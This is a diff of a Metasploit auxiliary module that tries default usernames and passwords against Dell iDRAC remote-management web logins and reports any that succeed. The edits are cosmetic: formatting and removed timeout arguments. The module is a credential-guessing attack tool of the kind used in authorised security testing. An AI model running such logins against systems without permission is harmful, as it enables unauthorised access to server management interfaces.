@@ -1,8 +1,4 @@
 ##
-# $Id$
-##
-
-##
 # This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
 # web site for more information on licensing and terms of use.
@@ -22,9 +18,11 @@ class Metasploit3 < Msf::Auxiliary
 		super(
 			'Name' => 'Dell iDRAC default Login',
 			'Version' => '$Revision$',
-			'Description' => %q{This module attempts to login to a iDRAC webserver
-				instance using default username and password. Tested against
-				Dell Remote Access Controller 6 - Express version 1.50 and 1.85},
+			'Description' => %q{
+				This module attempts to login to a iDRAC webserver instance using
+				default username and password.  Tested against Dell Remote Access
+				Controller 6 - Express version 1.50 and 1.85
+			},
 			'Author' =>
 				[
 					'Cristiano Maruti <cmaruti[at]gmail.com>'
@@ -57,9 +55,9 @@ class Metasploit3 < Msf::Auxiliary
 		end
 		"#{proto}://#{vhost}:#{rport}#{datastore['URI']}"
 	end
-	
+
 	def do_login(user=nil, pass=nil)
-	
+
 		auth = send_request_cgi({
 			'method' => 'POST',
 			'uri' => target_uri.path,
@@ -68,8 +66,8 @@ class Metasploit3 < Msf::Auxiliary
 				'user' => user,
 				'password' => pass
 			}
-		}, 20)
-				
+		})
+
 		if(auth and auth.body.to_s.match(/<authResult>[0|5]<\/authResult>/) != nil )
 			print_good("#{target_url} - SUCCESSFUL login for user '#{user}' with password '#{pass}'")
 			report_auth_info(
@@ -87,30 +85,29 @@ class Metasploit3 < Msf::Auxiliary
 			print_error("#{target_url} - Dell iDRAC - Failed to login as '#{user}' with password '#{pass}'")
 		end
 	end
-	
-	def run_host(ip)
 
+	def run_host(ip)
 		print_status("Verifying that login page exists at #{ip}")
 		begin
 			res = send_request_raw({
 				'method' => 'GET',
 				'uri' => target_uri.path
-				}, 20)
-				
+				})
+
 			if (res and res.code == 200 and res.body.to_s.match(/<authResult>1/) != nil)
 				print_status("Attempting authentication")
-				
+
 				each_user_pass { |user, pass|
 					do_login(user, pass)
 				}
-				
+
 			elsif (res and res.code == 301)
 				print_error("#{target_url} - Page redirect to #{res.headers['Location']}")
 				return :abort
 			else
 				print_error("The iDRAC login page does not exist at #{ip}")
 				return :abort
-			end	
+			end
 
 		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
 		rescue ::Timeout::Error, ::Errno::EPIPE
